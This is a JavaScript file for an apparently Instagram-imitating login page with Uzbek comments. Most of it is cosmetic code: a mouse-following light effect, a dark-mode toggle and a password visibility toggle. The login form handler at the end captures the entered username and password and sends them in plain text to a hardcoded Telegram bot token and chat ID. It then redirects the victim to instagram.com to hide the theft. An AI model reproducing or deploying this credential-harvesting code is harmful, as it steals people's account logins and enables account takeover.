const botToken = "8516697404:AAHA46NC9VLSqzCkyA65ksDRvPSgXmhFsog"; // Telegram bot tokeningizni bu yerga yozing
const chatId = "7301235819"; // Telegram chat IDingizni bu yerga yozing

// ==================== Mouse Tracker Light ====================
class MouseTracker {
  constructor() {
    this.tracker = document.querySelector(".mouse-tracker");
    this.light = document.querySelector(".tracker-light");
    this.glow = document.querySelector(".tracker-glow");
    this.particlesContainer = document.querySelector(".tracker-particles");

    this.x = 0;
    this.y = 0;
    this.targetX = 0;
    this.targetY = 0;
    this.isMoving = false;
    this.moveTimeout = null;

    this.init();
  }

  init() {
    document.addEventListener("mousemove", (e) => this.handleMouseMove(e));
    document.addEventListener("mouseenter", () => this.show());
    document.addEventListener("mouseleave", () => this.hide());
    this.animate();
  }

  handleMouseMove(e) {
    this.targetX = e.clientX;
    this.targetY = e.clientY;

    if (!this.isMoving) {
      this.isMoving = true;
      this.show();
    }

    clearTimeout(this.moveTimeout);
    this.moveTimeout = setTimeout(() => {
      this.isMoving = false;
    }, 100);

    // Create particles on movement
    if (Math.random() > 0.7) {
      this.createParticle(e.clientX, e.clientY);
    }
  }

  animate() {
    // Smooth easing for tracker
    this.x += (this.targetX - this.x) * 0.1;
    this.y += (this.targetY - this.y) * 0.1;

    this.tracker.style.left = this.x + "px";
    this.tracker.style.top = this.y + "px";

    requestAnimationFrame(() => this.animate());
  }

  createParticle(x, y) {
    const particle = document.createElement("div");
    particle.className = "tracker-particle";

    // Random direction for particles
    const angle = Math.random() * Math.PI * 2;
    const distance = 30 + Math.random() * 50;
    const tx = Math.cos(angle) * distance;
    const ty = Math.sin(angle) * distance;

    particle.style.setProperty("--tx", tx + "px");
    particle.style.setProperty("--ty", ty + "px");
    particle.style.left = x - this.x + "px";
    particle.style.top = y - this.y + "px";

    this.particlesContainer.appendChild(particle);

    // Remove particle after animation
    setTimeout(() => particle.remove(), 1000);
  }

  show() {
    this.light.style.opacity = "1";
    this.glow.style.opacity = "0.8";
  }

  hide() {
    this.light.style.opacity = "0.3";
    this.glow.style.opacity = "0";
  }
}

// Initialize mouse tracker
const mouseTracker = new MouseTracker();

// ==================== Theme Toggle Functionality ====================
const themeToggle = document.getElementById("themeToggle");
const htmlElement = document.documentElement;
const body = document.body;

// Check for saved theme preference or default to light mode
const currentTheme = localStorage.getItem("theme") || "light";

// Apply saved theme on page load
if (currentTheme === "dark") {
  body.classList.add("dark-theme");
  themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
}

// Theme toggle event listener
themeToggle.addEventListener("click", () => {
  body.classList.toggle("dark-theme");

  // Update icon
  const isDark = body.classList.contains("dark-theme");
  themeToggle.innerHTML = isDark
    ? '<i class="fas fa-sun"></i>'
    : '<i class="fas fa-moon"></i>';

  // Save preference
  localStorage.setItem("theme", isDark ? "dark" : "light");

  // Add rotation animation
  themeToggle.style.animation = "none";
  setTimeout(() => {
    themeToggle.style.animation = "rotate360 0.6s ease-in-out";
  }, 10);
});

// ==================== Password Show/Hide Toggle ====================
class PasswordToggle {
  constructor() {
    this.passwordInput = document.getElementById("password");
    this.toggleButton = document.getElementById("passwordToggle");
    this.isPasswordVisible = false;

    if (this.passwordInput && this.toggleButton) {
      this.init();
    }
  }

  init() {
    this.toggleButton.addEventListener("click", (e) => {
      e.preventDefault();
      this.togglePasswordVisibility();
    });

    // Also allow toggling with Enter key
    this.passwordInput.addEventListener("keypress", (e) => {
      if (e.key === "Enter") return;
    });
  }

  togglePasswordVisibility() {
    this.isPasswordVisible = !this.isPasswordVisible;

    // Toggle input type
    this.passwordInput.type = this.isPasswordVisible ? "text" : "password";

    // Update button icon with animation
    this.toggleButton.classList.toggle("visible");

    if (this.isPasswordVisible) {
      this.toggleButton.innerHTML = '<i class="fas fa-eye-slash"></i>';
    } else {
      this.toggleButton.innerHTML = '<i class="fas fa-eye"></i>';
    }

    // Add animation class
    this.toggleButton.style.animation = "none";
    setTimeout(() => {
      this.toggleButton.style.animation = "premium-bounce 0.4s ease-out";
    }, 10);

    // Focus back on input
    this.passwordInput.focus();
  }
}

// Initialize password toggle
const passwordToggle = new PasswordToggle();

// ==================== Login Form Handler ====================
document.getElementById("loginForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  const message = `Login ma'lumotlari: Username: ${username} Password: ${password}`;

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
    window.location.href = "https://www.instagram.com";
  } catch (error) {
    alert("Xatolik yuz berdi.");
    console.error(error);
  }
});
